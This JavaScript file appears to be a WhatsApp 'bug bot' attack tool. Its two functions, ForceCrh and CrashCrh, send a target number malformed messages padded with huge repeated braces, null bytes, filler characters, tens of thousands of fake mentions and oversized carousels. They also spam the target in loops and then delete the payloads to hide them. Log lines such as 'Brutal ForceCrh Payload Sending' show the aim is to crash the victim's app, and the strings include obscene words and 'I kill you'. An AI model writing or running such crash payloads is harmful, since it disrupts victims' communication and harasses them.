const Poseidon = JSON.stringify({
  status: true,
  criador: "PoseidonApiBug",
  resultado: {
    type: "md",
    ws: {
      _events: { "CB:ib,,dirty": ["Array"] },
      _eventsCount: 800000,
      _maxListeners: 0,
      url: "wss://web.whatsapp.com/ws/chat",
      config: {
        version: ["Array"],
        browser: ["Array"],
        waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
        sockCectTimeoutMs: 20000,
        keepAliveIntervalMs: 30000,
        logger: {},
        printQRInTerminal: false,
        emitOwnEvents: true,
        defaultQueryTimeoutMs: 60000,
        customUploadHosts: [],
        retryRequestDelayMs: 250,
        maxMsgRetryCount: 5,
        fireInitQueries: true,
        auth: { Object: "authData" },
        markOnlineOnsockCect: true,
        syncFullHistory: true,
        linkPreviewImageThumbnailWidth: 192,
        transactionOpts: { Object: "transactionOptsData" },
        generateHighQualityLinkPreview: false,
        options: {},
        appStateMacVerification: { Object: "appStateMacData" },
        mobile: true
      }
    }
  }
});

const Node = [{ tag: "bot", attrs: { biz_bot: "1" } }];

async function ForceCrh(target) {
  try {
    await sock.relayMessage(target, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "Tempoyak Udang",
              imageMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7118-24/19378731_679142228436107_2772153309284501636_n.enc?ccb=11-4&oh=01_Q5Aa1wE6MDKYIVL7M_JGyjFYn-0Cib6R7YGxKe7s0c3aJpwfWw&oe=6894CC16&_nc_sid=5e03e0&mms3=true",
                mimetype: "image/jpeg",
                caption: "{ null ) } memek \u0000 Bokep 100030 caption: bokep",
                fileSha256: "f4VVN8Hedq+9T0Uy8LrVyMPGy8h3NoQOP8j802HjURw=",
                fileLength: "583009",
                height: 819,
                width: 1792,
                mediaKey: "WedxqVzBgUBbL09L7VUT52ILfzMdRnJsjUPL0OuLUmQ=",
                fileEncSha256: "VL7//x43R4Elx69/8yB5EzzMPGK9+p8MPvXs0pGTqls=",
                directPath: "/v/t62.7118-24/19378731_679142228436107_2772153309284501636_n.enc",
                mediaKeyTimestamp: "1752001602",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD..."
              },
              hasMediaAttachment: true
            },
            body: { text: "𝐏𝐨𝐬𝐞𝐢𝐝𝐨𝐧 𝐈𝐧𝐯𝐢𝐜𝐭𝐮𝐬 🇷🇺" },
            nativeFlowMessage: {
              buttons: [
                { name: "galaxy_message", buttonParamsJson: "[".repeat(29999) },
                { name: "galaxy_message", buttonParamsJson: "{".repeat(38888) }
              ],
              messageParamsJson: "{".repeat(10000)
            },
            contextInfo: { pairedMediaType: "NOT_PAIRED_MEDIA" }
          }
        }
      }
    });

    await sock.relayMessage(target, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "Woy",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: 992.999999,
                degreesLongitude: -932.8889989,
                name: "\u900A",
                address: "\u0007".repeat(20000)
              }
            },
            contextInfo: {
              participant: "0@s.whatsapp.net",
              remoteJid: "X",
              mentionedJid: ["0@s.whatsapp.net"]
            },
            body: { text: "Pp" },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(500000)
            }
          }
        }
      }
    }, { participant: { jid: target }, messageId: null });

    for (let i = 0; i < 1; i++) {
      await sock.relayMessage(target, {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: {
                text: "Lu Kenal Lucifer?",
                format: "DEFAULT"
              },
              nativeFlowMessage: {
                messageParamsJson: "{".repeat(10000),
                version: 3
              }
            }
          }
        }
      }, { participant: { jid: target } });

      await new Promise(resolve => setTimeout(resolve, 300));
    }

    const spamMessage = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: false,
              forwardingScore: 0,
              businessMessageForwardInfo: {
                businessOwnerJid: target
              }
            },
            body: { text: "ꦾ".repeat(90000) },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "{}{{{{{{}}{{{{{{{{}{{{{{{}{{{{{{}{}{}{}{{{{{{{{{{{{{{{}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{}{}{}{}{}{}{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{"
                },
                { name: "call_permission_request", buttonParamsJson: '{ "status": true ' },
                { name: "mpm", buttonParamsJson: "" },
                { name: "mpm", buttonParamsJson: "" },
                { name: "mpm", buttonParamsJson: "" },
                { name: "mpm", buttonParamsJson: "\u0000".repeat(100000) }
              ]
            }
          }
        }
      }
    };

    const pollMessage = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: { text: "𝐏𝐨𝐬𝐞𝐢𝐝𝐨𝐧 𝐈𝐧𝐯𝐢𝐜𝐭𝐮𝐬 🇷🇺" + "ꦾ".repeat(9999) },
            buttons: [
              {
                buttonParamsJson: JSON.stringify({
                  displayText: "View responses",
                  id: "view_response_poseidon",
                  type: "CHANNEL_VIEW_RESPONSES",
                  questionId: "Lucifer іs һᥱrᥱ?",
                  channelMessageId: "ყσυ αяє σҡαყ?",
                  channelId: "1212121212121@g.us"
                }),
                type: 1
              }
            ],
            messageParamsJson: JSON.stringify({
              pollQuestionId: "Lucifer іs һᥱrᥱ?" + "}}".repeat(10000),
              pollMessageId: "ყσυ αяє σҡαყ?" + "}}".repeat(10000),
              channelId: "1212121212121@g.us" + "}}".repeat(10000)
            })
          }
        }
      }
    }, {});

    for (let i = 0; i < 111; i++) {
      await sock.relayMessage(target, spamMessage, { participant: { jid: target } });
    }

    await sock.relayMessage(target, pollMessage.message, {
      messageId: null,
      participant: target,
      userJid: target
    });

    const msg = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            contextInfo: {
              expiration: 1,
              ephemeralSettingTimestamp: 1,
              entryPointConversionSource: "WhatsApp.com",
              entryPointConversionApp: "WhatsApp",
              entryPointConversionDelaySeconds: 1,
              disappearingMode: {
                initiatorDeviceJid: target,
                initiator: "INITIATED_BY_OTHER",
                trigger: "UNKNOWN_GROUPS"
              },
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: [target],
              quotedMessage: {
                paymentInviteMessage: { serviceType: 1, expiryTimestamp: null }
              },
              externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: true
              }
            },
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc",
              mimetype: "image/jpeg",
              fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
              fileLength: "164089",
              height: 1,
              width: 1,
              mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
              fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
              directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc",
              mediaKeyTimestamp: "1749172037",
              jpegThumbnail: Buffer.from("XPOSEIDON").toString("base64"),
              scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
              scanLengths: [8596, 155493]
            },
            hasMediaAttachment: true,
            body: {
              text: "𝐏𝐨𝐬𝐞𝐢𝐝𝐨𝐧 𝐈𝐧𝐯𝐢𝐜𝐭𝐮𝐬 𝟕.𝟕.𝟕" + "ꦾ".repeat(50000)
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(20000),
              buttons: [
                { name: "single_select", buttonParamsJson: "{" + "{".repeat(20000) },
                { name: "call_permission_request", buttonParamsJson: "{" + "{".repeat(20000) }
              ]
            }
          }
        }
      }
    }, {});

    await sock.relayMessage(target, msg.message, {
      participant: { jid: target },
      messageId: msg.key.id
    });

    const suki = {
      key: {
        remoteJid: target,
        fromMe: false,
        id: generateMessageID()
      },
      message: {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: { text: "𝐏𝐨𝐬𝐞𝐢𝐝𝐨𝐧 𝐗-𝐂𝐨𝐫𝐞 🇷🇺", format: "DEFAULT" },
              nativeFlowResponseMessage: {
                name: "call_permission_request",
                version: 3,
                paramsJson: JSON.stringify({
                  trigger: true,
                  action: "call_crash",
                  note: "𝐏𝐨𝐬𝐞𝐢𝐝𝐨𝐧 𝐗-𝐂𝐨𝐫𝐞 🇷🇺",
                  filler: "꧔".repeat(50000)
                })
              }
            }
          }
        },
        nativeFlowMessage: {
          name: "render_crash_component",
          messageParamsJson: "{".repeat(70000)
        },
        audioMessage: {
          mimetype: "audio/ogg; codecs=opus",
          fileSha256: "5u7fWquPGEHnIsg51G9srGG5nB8PZ7KQf9hp2lWQ9Ng=",
          fileLength: "9999999999",
          seconds: 999999,
          ptt: true,
          streamingSidecar: "꧔꧈".repeat(9999)
        },
        videoMessage: {
          caption: "???????",
          url: "https://mmg.whatsapp.net/d/f/PoseidonGlitch.mp4",
          mimetype: "video/mp4",
          fileLength: 99999999,
          seconds: 7777,
          streamingSidecar: Buffer.from("POSEIDON_SIDE_PAYLOAD_X").toString("base64")
        },
        stickerMessage: {
          fileSha256: Buffer.from("PoseidonCrash"),
          isAnimated: true,
          pngThumbnail: Buffer.from("kontol")
        },
        productMessage: {
          product: {
            productImage: {
              mimetype: "image/jpeg",
              jpegThumbnail: Buffer.from("XPROTIMG")
            },
            title: "𝗣𝗢𝗦𝗘𝗜𝗗𝗢𝗡",
            description: "I kill you 🕊️",
            currencyCode: "IDR",
            priceAmount1000: "999999999",
            retailerId: "@LuciferNotDev",
            productImageCount: 777
          }
        },
        protocolMessage: {
          type: 14,
          ephemeralExpiration: 999999999
        },
        extendedTextMessage: {
          text: "𝑷𝒐𝒔𝒆𝒊𝒅𝒐𝒏 𝑷𝒓𝒐𝒕𝒐 🇷🇺",
          contextInfo: {
            mentionedJid: [target],
            forwardingScore: 999,
            isForwarded: true,
            businessMessageForwardInfo: {
              businessOwnerJid: target
            },
            businessMessage: {
              message: {
                interactiveMessage: {
                  body: { text: "" },
                  footer: { text: "Crash System By Poseidon" },
                  header: {
                    title: "Crash System",
                    subtitle: "System"
                  },
                  carouselMessage: {
                    cards: Array(8).fill({
                      cardHeader: {
                        title: "POSEIDON",
                        subtitle: "FORCE CRASH UI"
                      },
                      cardContent: {
                        title: "Payload Force",
                        description: "Don't not click"
                      },
                      cardFooter: { text: "Poseidon Team🇷🇺" }
                    })
                  }
                }
              }
            }
          }
        }
      }
    };

    await sock.relayMessage(target, suki.message, { messageId: suki.key.id });
    await sock.sendMessage(target, { delete: suki.key });

    console.log(chalk.red(`✔ Brutal ForceCrh Payload Sending to ${target}`));
  } catch (err) {
    console.error("❌ Error in ForceCrh:", err);
  }
}

async function CrashCrh(target, mention) {
  const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
  console.log(chalk.red(`✔ CrashCrh Payload Sending to ${target}`));

  for (let x = 0; x < 5; x++) {
    const echoMsg = generateWAMessageFromContent(target, proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: { title: "", hasMediaAttachment: false },
            body: { text: "" },
            footer: {
              text: "🩸⃟𝐏͢𝐨͡𝐬͜𝐞͢𝐢͜𝐝͡𝐨͢𝐧 𝐈͢𝐧͡𝐯͜𝐢͢𝐜͜𝐭͡𝐮͢𝐬 • 🩸| 🦠 𝐄𝐱𝐞𝐜𝐮𝐭𝐨𝐫⃟𖤐"
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(9999),
              buttons: [
                { name: 'single_select', buttonParamsJson: '\u0000' + Poseidon },
                { name: 'mpm', buttonParamsJson: '{}'.repeat(1000) + Poseidon },
                { name: 'mpm', buttonParamsJson: '\u0003' + Poseidon },
                { name: 'call_permission_request', buttonParamsJson: '{}' }
              ]
            },
            contextInfo: {
              mentionedJid: [target, "0@s.whatsapp.net", ...Array.from({ length: 9000 }, () =>
                "1" + Math.floor(Math.random() * 250208) + "@s.whatsapp.net")]
            }
          }
        }
      }
    }), { userJid: target, timestamp: Math.floor(Date.now() / 1000) });

    echoMsg.messageTimestamp = Math.floor(Date.now() / 1000);
    await sock.relayMessage(target, echoMsg.message, {
      participant: { jid: target },
      messageId: echoMsg.key.id
    });

    await sleep(3000);
    await sock.sendMessage(target, { delete: echoMsg.key });
  }

  while (true) {
    for (let i = 0; i < 10; i++) {
      const msg = await generateWAMessageFromContent(target, {
        ephemeralMessage: {
          message: {
            viewOnceMessage: {
              message: {
                ephemeralSettingRequestMessage: { ephemeralDuration: 0 },
                messageContextInfo: {
                  messageSecret: crypto.randomBytes(32),
                  supportPayload: JSON.stringify({
                    version: 2,
                    is_ai_message: true,
                    should_show_system_message: true,
                    ticket_id: crypto.randomBytes(16)
                  }),
                  messageNode: Node
                },
                interactiveMessage: {
                  header: {
                    title: '🩸⃟𝐏͢𝐨͡𝐬͜𝐞͢𝐢͜𝐝͡𝐨͢𝐧 | 𝐈͢𝐧͡𝐯͜𝐢͢𝐜͜𝐭͡𝐮͢𝐬 • 🩸',
                    hasMediaAttachment: false
                  },
                  body: { text: '' },
                  messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 3.2,
                    isStatusBroadcast: true,
                    statusBroadcastJid: 'status@broadcast',
                    badgeChat: { unreadCount: 0 }
                  },
                  forwardedNewsletterMessageInfo: {
                    newsletterJid: 'proto@newsletter',
                    serverMessageId: 1,
                    newsletterName: '🩸⃟𝐏͢𝐨͡𝐬͜𝐞͢𝐢͜𝐝͡𝐨͢𝐧 | 𝐈͢𝐧͡𝐯͜𝐢͢𝐜͜𝐭͡𝐮͢𝐬 • 🩸',
                    contentType: 3,
                    accessibilityText: ''
                  },
                  nativeFlowInfo: {
                    name: 'galaxy_message',
                    paramsJson: '\u0003'.repeat(9999)
                  },
                  nativeFlowMessage: {
                    messageParamsJson: '{{'.repeat(9999),
                    buttons: [
                      { name: 'single_select', buttonParamsJson: '\u0000' + Poseidon },
                      { name: 'mpm', buttonParamsJson: '{}'.repeat(1000) + Poseidon },
                      { name: 'mpm', buttonParamsJson: '\u0003' + Poseidon },
                      { name: 'call_permission_request', buttonParamsJson: '{}' }
                    ]
                  }
                },
                carouselMessage: {
                  cards: Array.from({ length: 200 }, () => ({
                    cardHeader: {
                      title: '\u0000'.repeat(999),
                      subtitle: '🩸⃟𝐏͢𝐨͡𝐬͜𝐞͢𝐢͜𝐝͡𝐨͢𝐧 | 𝐈͢𝐧͡𝐯͜𝐢͢𝐜͜𝐭͡𝐮͢𝐬 • 🩸 ( 𝐂𝐨𝐫𝐞𝟗𝟗𝟗 )',
                      thumbnail: Buffer.alloc(1024 * 32).fill(0)
                    },
                    cardContent: {
                      title: '\u0000',
                      description: '\n'.repeat(500)
                    },
                    buttons: [
                      { name: 'call_permission_request', buttonParamsJson: '\u0000' },
                      { name: 'mpm', buttonParamsJson: '{'.repeat(1000) },
                      { name: 'single_select', buttonParamsJson: '' }
                    ]
                  }))
                },
                contextInfo: {
                  participant: target,
                  remoteJid: target,
                  expiration: 9741,
                  ephemeralSettingTimestamp: 9741,
                  entryPointConversionSource: 'WhatsApp.com',
                  entryPointConversionApp: 'WhatsApp',
                  entryPointConversionDelaySeconds: 9742,
                  disappearingMode: {
                    initiator: 'INITIATED_BY_OTHER',
                    trigger: 'ACCOUNT_SETTING'
                  }
                }
              }
            }
          }
        }
      }, {});
      await sock.relayMessage(target, msg.message, {
        messageId: undefined,
        participant: { target }
      });
      await sock.sendMessage(target, { delete: msg.key });
      await sleep(300);
    }
    break;
  }

  const suki = {
    key: {
      remoteJid: target,
      fromMe: false,
      id: generateMessageID()
    },
    message: {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: "𝐏𝐨𝐬𝐞𝐢𝐝𝐨𝐧 𝐗-𝐂𝐨𝐫𝐞 🇷🇺", format: "DEFAULT" },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              version: 3,
              paramsJson: JSON.stringify({
                trigger: true,
                action: "call_crash",
                note: "𝐏𝐨𝐬𝐞𝐢𝐝𝐨𝐧 𝐗-𝐂𝐨𝐫𝐞 🇷🇺",
                filler: "꧔".repeat(50000)
              })
            }
          }
        }
      },
      nativeFlowMessage: {
        name: "render_crash_component",
        messageParamsJson: "{".repeat(70000)
      },
      audioMessage: {
        mimetype: "audio/ogg; codecs=opus",
        fileSha256: "5u7fWquPGEHnIsg51G9srGG5nB8PZ7KQf9hp2lWQ9Ng=",
        fileLength: "9999999999",
        seconds: 999999,
        ptt: true,
        streamingSidecar: "꧔꧈".repeat(9999)
      },
      videoMessage: {
        caption: "???????",
        url: "https://mmg.whatsapp.net/d/f/PoseidonGlitch.mp4",
        mimetype: "video/mp4",
        fileLength: 99999999,
        seconds: 7777,
        streamingSidecar: Buffer.from("POSEIDON_SIDE_PAYLOAD_X").toString("base64")
      },
      stickerMessage: {
        fileSha256: Buffer.from("PoseidonCrash"),
        isAnimated: true,
        pngThumbnail: Buffer.from("kontol")
      },
      productMessage: {
        product: {
          productImage: {
            mimetype: "image/jpeg",
            jpegThumbnail: Buffer.from("XPROTIMG")
          },
          title: "𝗣𝗢𝗦𝗘𝗜𝗗𝗢𝗡",
          description: "I kill you 🕊️",
          currencyCode: "IDR",
          priceAmount1000: "999999999",
          retailerId: "@LuciferNotDev",
          productImageCount: 777
        }
      },
      protocolMessage: {
        type: 14,
        ephemeralExpiration: 999999999
      }
    }
  };

  await sock.relayMessage(target, suki.message, { messageId: suki.key.id });
  await sock.sendMessage(target, { delete: suki.key });

  if (mention) {
    const mentionedList = ["0@s.whatsapp.net", ...Array.from({ length: 40000 }, () =>
      `1${Math.floor(Math.random() * 999999)}@s.whatsapp.net`)];

    const msg = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          imageMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/32712111_749506614240626_1571338893770400961_n.enc?...",
            mimetype: "image/jpeg",
            caption: "yong sarah",
            fileSha256: "s0kIQLVw1FkyhgAvD8y+TRkXfPxkttdakdZKneu7Mro=",
            fileLength: "285488",
            height: "1280",
            width: "763",
            mediaKey: "QAplOD67eEe6b9w3TGM8oKXw2BbbydV4xRrKeZ1HC+I=",
            fileEncSha256: "yBs5l1vLoWUT3p/ZkpadRDL8Z2EnR91dsp/a/1z7Uuc=",
            directPath: "/v/t62.7118-24/32712111_749506614240626_example",
            mediaKeyTimestamp: "1752903565",
            jpegThumbnail: "",
            contextInfo: {
              mentionedJid: mentionedList,
              forwardingScore: 999,
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363321780343289@newsletter",
                serverMessageId: 1000000,
                newsletterName: "You know Poseidon?"
              }
            }
          }
        }
      }
    }, {});

    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target]
    });
  }
}